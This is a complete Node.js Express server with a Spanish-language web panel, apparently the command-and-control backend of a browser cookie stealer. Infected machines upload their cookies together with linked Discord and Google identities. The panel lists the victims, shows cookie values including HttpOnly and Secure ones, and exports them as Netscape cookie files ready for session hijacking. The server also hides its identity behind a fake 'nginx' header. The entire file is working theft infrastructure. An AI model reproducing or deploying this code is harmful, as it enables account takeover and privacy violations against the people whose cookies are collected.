const express = require("express");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 7700;
const API_KEY = process.env.API_KEY || "changeme_" + crypto.randomBytes(8).toString("hex");
const DATA_DIR = path.join(__dirname, "data");

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

app.use(express.json({ limit: "50mb" }));

// ── Strip all identifying headers ──
app.use((req, res, next) => {
  res.removeHeader("X-Powered-By");
  res.setHeader("Server", "nginx");
  next();
});

// ── Auth middleware for upload ──
function authCheck(req, res, next) {
  const key = req.headers["x-api-key"] || req.query.key;
  if (key !== API_KEY) return res.status(401).json({ error: "unauthorized" });
  next();
}

// ── Upload cookies from a machine ──
app.post("/api/upload", authCheck, (req, res) => {
  const { machineId, identity, cookies, timestamp } = req.body;
  if (!machineId || !cookies) return res.status(400).json({ error: "machineId and cookies required" });

  const safeId = machineId.replace(/[^a-zA-Z0-9_-]/g, "_").substring(0, 64);
  const filePath = path.join(DATA_DIR, safeId + ".json");

  const record = {
    machineId: safeId,
    identity: identity || { discord: null, google: [] },
    lastUpdated: timestamp || new Date().toISOString(),
    cookieCount: cookies.length,
    domains: [...new Set(cookies.map(c => c.domain.replace(/^\./, "")))].sort(),
    cookies
  };

  fs.writeFileSync(filePath, JSON.stringify(record, null, 2), "utf8");
  console.log(`[+] ${safeId}: ${cookies.length} cookies, ${record.domains.length} domains`);
  res.json({ ok: true, stored: cookies.length });
});

// ── Get all machines ──
app.get("/api/machines", (req, res) => {
  const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith(".json"));
  const machines = files.map(f => {
    const data = JSON.parse(fs.readFileSync(path.join(DATA_DIR, f), "utf8"));
    return {
      machineId: data.machineId,
      identity: data.identity || { discord: null, google: [] },
      lastUpdated: data.lastUpdated,
      cookieCount: data.cookieCount,
      domainCount: data.domains.length
    };
  });
  res.json(machines);
});

// ── Get cookies for a machine ──
app.get("/api/cookies/:machineId", (req, res) => {
  const safeId = req.params.machineId.replace(/[^a-zA-Z0-9_-]/g, "_");
  const filePath = path.join(DATA_DIR, safeId + ".json");
  if (!fs.existsSync(filePath)) return res.status(404).json({ error: "not found" });
  const data = JSON.parse(fs.readFileSync(filePath, "utf8"));
  res.json(data);
});

// ── Get ALL cookies combined ──
app.get("/api/cookies", (req, res) => {
  const files = fs.readdirSync(DATA_DIR).filter(f => f.endsWith(".json"));
  const all = [];
  for (const f of files) {
    const data = JSON.parse(fs.readFileSync(path.join(DATA_DIR, f), "utf8"));
    for (const c of data.cookies) {
      c._machine = data.machineId;
      c._updated = data.lastUpdated;
      all.push(c);
    }
  }
  res.json({ cookies: all, total: all.length });
});

// ── Panel HTML ──
app.get("/", (req, res) => {
  res.send(PANEL_HTML);
});

const PANEL_HTML = `<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Cookie Panel — Central</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#0a0a0f;color:#c8d6e5;min-height:100vh}
.top-bar{background:linear-gradient(135deg,#0d1117,#161b22);border-bottom:1px solid #30363d;padding:16px 24px;display:flex;align-items:center;gap:16px;flex-wrap:wrap}
.top-bar h1{font-size:20px;color:#58a6ff;flex-shrink:0}
.top-bar .stats{font-size:13px;color:#8b949e;display:flex;gap:18px;flex-wrap:wrap}
.top-bar .stats span{color:#c9d1d9}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:4px;vertical-align:middle}
.dot-green{background:#3fb950}.dot-red{background:#f85149}.dot-yellow{background:#d29922}
.tabs{display:flex;gap:0;border-bottom:1px solid #21262d;background:#0d1117}
.tab{padding:12px 20px;cursor:pointer;color:#8b949e;font-size:14px;border-bottom:2px solid transparent;transition:all .15s}
.tab:hover{color:#c9d1d9}.tab.active{color:#58a6ff;border-bottom-color:#58a6ff}
.controls{padding:14px 24px;background:#0d1117;border-bottom:1px solid #21262d;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
input[type=text]{background:#161b22;border:1px solid #30363d;color:#c9d1d9;padding:8px 14px;border-radius:6px;font-size:14px;width:320px;outline:none}
input[type=text]:focus{border-color:#58a6ff}
select{background:#161b22;border:1px solid #30363d;color:#c9d1d9;padding:8px 12px;border-radius:6px;font-size:14px;outline:none}
button{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:8px 16px;border-radius:6px;cursor:pointer;font-size:13px;transition:background .15s}
button:hover{background:#30363d}
.btn-blue{background:#1f6feb;border-color:#1f6feb;color:#fff}.btn-blue:hover{background:#388bfd}
.btn-green{background:#238636;border-color:#238636;color:#fff}.btn-green:hover{background:#2ea043}
.container{padding:20px 24px}
.machine-card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:18px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:12px;cursor:pointer;transition:border-color .15s}
.machine-card:hover{border-color:#58a6ff}
.machine-info h3{color:#58a6ff;font-size:16px;margin-bottom:4px}
.machine-info p{color:#8b949e;font-size:13px}
.machine-stats{display:flex;gap:16px;align-items:center}
.machine-stats .stat{text-align:center}
.machine-stats .stat .n{font-size:22px;font-weight:700;color:#c9d1d9}
.machine-stats .stat .l{font-size:11px;color:#8b949e;text-transform:uppercase}
.domain-group{margin-bottom:12px;border:1px solid #21262d;border-radius:10px;overflow:hidden}
.domain-header{background:#161b22;padding:12px 16px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;user-select:none}
.domain-header:hover{background:#1c2128}
.domain-name{font-weight:600;color:#58a6ff;font-size:15px}
.domain-count{background:#30363d;color:#8b949e;padding:2px 10px;border-radius:99px;font-size:12px}
.domain-actions{display:flex;gap:6px;align-items:center}
.cookie-table{width:100%;border-collapse:collapse;display:none}
.domain-group.open .cookie-table{display:table}
.cookie-table th{background:#0d1117;color:#8b949e;font-weight:500;font-size:12px;text-transform:uppercase;letter-spacing:.5px;padding:8px 12px;text-align:left;border-bottom:1px solid #21262d}
.cookie-table td{padding:8px 12px;border-bottom:1px solid #161b22;font-size:13px;max-width:340px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.cookie-table tr:hover td{background:#161b22}
.tag{display:inline-block;padding:1px 7px;border-radius:4px;font-size:11px;font-weight:500}
.tag-secure{background:#0d419d;color:#79c0ff}
.tag-http{background:#3d1e00;color:#d29922}
.tag-session{background:#1b3a1b;color:#3fb950}
.tag-expired{background:#3d0000;color:#f85149}
.empty{text-align:center;padding:60px;color:#484f58;font-size:15px}
#toast{position:fixed;bottom:24px;right:24px;background:#1f6feb;color:#fff;padding:10px 20px;border-radius:8px;font-size:13px;display:none;z-index:99;box-shadow:0 4px 12px rgba(0,0,0,.5)}
.hidden{display:none!important}
</style>
</head>
<body>
<div class="top-bar">
  <h1>🍪 Cookie Panel — Central</h1>
  <div class="stats">
    <div><span class="dot dot-green"></span>Máquinas: <span id="s-machines">0</span></div>
    <div>Total cookies: <span id="s-total">0</span></div>
    <div>Dominios: <span id="s-domains">0</span></div>
  </div>
</div>
<div class="tabs">
  <div class="tab active" data-tab="machines" onclick="switchTab('machines')">📡 Máquinas</div>
  <div class="tab" data-tab="cookies" onclick="switchTab('cookies')">🍪 Todas las Cookies</div>
</div>
<div class="controls">
  <input type="text" id="search" placeholder="Buscar dominio, cookie o máquina...">
  <select id="sort">
    <option value="alpha">A → Z</option>
    <option value="count">Más cookies primero</option>
  </select>
  <select id="machine-filter"><option value="all">Todas las máquinas</option></select>
  <button class="btn-blue" onclick="downloadFiltered('txt')">⬇ .txt</button>
  <button class="btn-blue" onclick="downloadFiltered('json')">⬇ .json</button>
  <button class="btn-green" onclick="refresh()">⟳ Actualizar</button>
</div>

<div class="container" id="tab-machines"></div>
<div class="container hidden" id="tab-cookies"></div>
<div id="toast"></div>

<script>
let MACHINES = [];
let ALL_COOKIES = [];
let currentTab = "machines";
let selectedMachine = "all";

async function fetchMachines() {
  const r = await fetch("/api/machines");
  MACHINES = await r.json();
  const sel = document.getElementById("machine-filter");
  const prev = sel.value;
  sel.innerHTML = '<option value="all">Todas las máquinas</option>';
  for (const m of MACHINES) sel.innerHTML += '<option value="'+esc(m.machineId)+'">'+esc(m.machineId)+'</option>';
  sel.value = prev || "all";
}

async function fetchAllCookies() {
  const r = await fetch("/api/cookies");
  const d = await r.json();
  ALL_COOKIES = d.cookies;
}

async function fetchMachineCookies(id) {
  const r = await fetch("/api/cookies/" + encodeURIComponent(id));
  return await r.json();
}

function switchTab(tab) {
  currentTab = tab;
  document.querySelectorAll(".tab").forEach(t => t.classList.toggle("active", t.dataset.tab === tab));
  document.getElementById("tab-machines").classList.toggle("hidden", tab !== "machines");
  document.getElementById("tab-cookies").classList.toggle("hidden", tab !== "cookies");
  render();
}

async function refresh() {
  await fetchMachines();
  await fetchAllCookies();
  render();
  toast("Actualizado");
}

function render() {
  updateStats();
  if (currentTab === "machines") renderMachines();
  else renderCookies();
}

function updateStats() {
  document.getElementById("s-machines").textContent = MACHINES.length;
  document.getElementById("s-total").textContent = ALL_COOKIES.length;
  document.getElementById("s-domains").textContent = new Set(ALL_COOKIES.map(c => (c.domain||"").replace(/^\\./, ""))).size;
}

function renderMachines() {
  const el = document.getElementById("tab-machines");
  if (!MACHINES.length) { el.innerHTML = '<div class="empty">No hay máquinas conectadas aún</div>'; return; }
  let html = "";
  for (const m of MACHINES) {
    const ago = timeAgo(m.lastUpdated);
    const id = m.identity || {};
    const dc = id.discord;
    const gg = (id.google || []);

    let discordTag = '<span style="color:#484f58">—</span>';
    if (dc) {
      const avatar = dc.avatar ? 'https://cdn.discordapp.com/avatars/'+dc.id+'/'+dc.avatar+'.png?size=32' : 'https://cdn.discordapp.com/embed/avatars/0.png';
      const name = dc.globalName || dc.username;
      discordTag = '<img src="'+avatar+'" style="width:20px;height:20px;border-radius:50%;vertical-align:middle;margin-right:6px"><span style="color:#5865F2;font-weight:600">'+esc(name)+'</span> <span style="color:#8b949e;font-size:12px">@'+esc(dc.username)+'</span>';
    }

    let googleTag = '<span style="color:#484f58">—</span>';
    if (gg.length) {
      googleTag = gg.map(g => '<span style="color:#ea4335;margin-right:4px">●</span><span style="font-weight:600">'+esc(g.displayName)+'</span>').join(' · ');
    }

    html += '<div class="machine-card" onclick="viewMachine(\\''+esc(m.machineId)+'\\')">';
    html += '<div class="machine-info"><h3>'+esc(m.machineId)+'</h3>';
    html += '<div style="margin-top:8px;display:flex;flex-direction:column;gap:5px">';
    html += '<div style="font-size:13px"><span style="color:#5865F2;margin-right:6px">Discord:</span>'+discordTag+'</div>';
    html += '<div style="font-size:13px"><span style="color:#ea4335;margin-right:6px">Google:</span>'+googleTag+'</div>';
    html += '</div>';
    html += '<p style="margin-top:6px">Actualizado: '+ago+'</p></div>';
    html += '<div class="machine-stats"><div class="stat"><div class="n">'+m.cookieCount+'</div><div class="l">cookies</div></div>';
    html += '<div class="stat"><div class="n">'+m.domainCount+'</div><div class="l">dominios</div></div></div>';
    html += '</div>';
  }
  el.innerHTML = html;
}

function viewMachine(id) {
  document.getElementById("machine-filter").value = id;
  selectedMachine = id;
  switchTab("cookies");
}

function renderCookies() {
  const el = document.getElementById("tab-cookies");
  const q = document.getElementById("search").value.toLowerCase();
  const sort = document.getElementById("sort").value;
  const mf = document.getElementById("machine-filter").value;

  let filtered = ALL_COOKIES;
  if (mf !== "all") filtered = filtered.filter(c => c._machine === mf);
  if (q) filtered = filtered.filter(c => (c.domain||"").toLowerCase().includes(q) || (c.name||"").toLowerCase().includes(q) || (c._machine||"").toLowerCase().includes(q));

  const groups = {};
  for (const c of filtered) {
    const d = (c.domain||"").replace(/^\\./, "");
    if (!groups[d]) groups[d] = [];
    groups[d].push(c);
  }

  let domains = Object.keys(groups);
  if (sort === "alpha") domains.sort();
  else domains.sort((a, b) => groups[b].length - groups[a].length);

  if (!domains.length) { el.innerHTML = '<div class="empty">No se encontraron cookies'+(q?' para "'+esc(q)+'"':'')+'</div>'; return; }

  let html = "";
  const now = Date.now() / 1000;
  for (const d of domains) {
    const cookies = groups[d];
    html += '<div class="domain-group">';
    html += '<div class="domain-header" onclick="this.parentElement.classList.toggle(\\'open\\')">';
    html += '<span class="domain-name">'+esc(d)+'</span>';
    html += '<div class="domain-actions">';
    html += '<button onclick="event.stopPropagation();downloadDomain(\\''+esc(d)+'\\',\\'txt\\')">txt</button>';
    html += '<button onclick="event.stopPropagation();downloadDomain(\\''+esc(d)+'\\',\\'json\\')">json</button>';
    html += '<span class="domain-count">'+cookies.length+'</span></div></div>';
    html += '<table class="cookie-table"><thead><tr><th>Máquina</th><th>Nombre</th><th>Valor</th><th>Path</th><th>Expira</th><th>Flags</th></tr></thead><tbody>';
    for (const c of cookies) {
      const exp = c.expires === 0 ? '<span class="tag tag-session">session</span>' : (c.expires < now ? '<span class="tag tag-expired">expired</span>' : new Date(c.expires * 1000).toLocaleDateString("es-AR"));
      let flags = "";
      if (c.secure) flags += '<span class="tag tag-secure">Secure</span> ';
      if (c.httpOnly) flags += '<span class="tag tag-http">HttpOnly</span> ';
      html += '<tr><td>'+esc(c._machine||"—")+'</td><td title="'+esc(c.name)+'">'+esc(c.name)+'</td><td title="'+esc(c.value)+'">'+esc(c.value)+'</td><td>'+esc(c.path)+'</td><td>'+exp+'</td><td>'+flags+'</td></tr>';
    }
    html += '</tbody></table></div>';
  }
  el.innerHTML = html;
}

function timeAgo(iso) {
  if (!iso) return "—";
  const s = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
  if (s < 60) return "hace " + s + "s";
  if (s < 3600) return "hace " + Math.floor(s/60) + "min";
  if (s < 86400) return "hace " + Math.floor(s/3600) + "h";
  return "hace " + Math.floor(s/86400) + "d";
}

function esc(s) { if (!s) return ""; const d = document.createElement("div"); d.textContent = s; return d.innerHTML; }

function downloadBlob(name, content, type) {
  const a = document.createElement("a");
  a.href = URL.createObjectURL(new Blob([content], { type }));
  a.download = name; a.click();
  toast("Descargado: " + name);
}

function downloadFiltered(fmt) {
  const mf = document.getElementById("machine-filter").value;
  let cookies = ALL_COOKIES;
  if (mf !== "all") cookies = cookies.filter(c => c._machine === mf);
  const name = (mf === "all" ? "all" : mf) + "_cookies";
  if (fmt === "json") downloadBlob(name+".json", JSON.stringify(cookies, null, 2), "application/json");
  else downloadBlob(name+".txt", toNetscape(cookies), "text/plain");
}

function downloadDomain(domain, fmt) {
  const cookies = ALL_COOKIES.filter(c => (c.domain||"").replace(/^\\./, "") === domain);
  if (fmt === "json") downloadBlob(domain+"_cookies.json", JSON.stringify(cookies, null, 2), "application/json");
  else downloadBlob(domain+"_cookies.txt", toNetscape(cookies), "text/plain");
}

function toNetscape(cookies) {
  let out = "# Netscape HTTP Cookie File\\n\\n";
  for (const c of cookies) out += (c.httpOnly?"#HttpOnly_":"") + c.domain + "\\tTRUE\\t" + c.path + "\\t" + (c.secure?"TRUE":"FALSE") + "\\t" + c.expires + "\\t" + c.name + "\\t" + c.value + "\\n";
  return out;
}

function toast(msg) { const t = document.getElementById("toast"); t.textContent = msg; t.style.display = "block"; setTimeout(() => t.style.display = "none", 2500); }

document.getElementById("search").addEventListener("input", render);
document.getElementById("sort").addEventListener("change", render);
document.getElementById("machine-filter").addEventListener("change", () => { selectedMachine = document.getElementById("machine-filter").value; render(); });

refresh();
setInterval(refresh, 30000);
</script>
</body>
</html>`;

app.listen(PORT, () => {
  console.log(`[+] Cookie Server → http://localhost:${PORT}`);
  console.log(`[+] API_KEY: ${API_KEY}`);
});
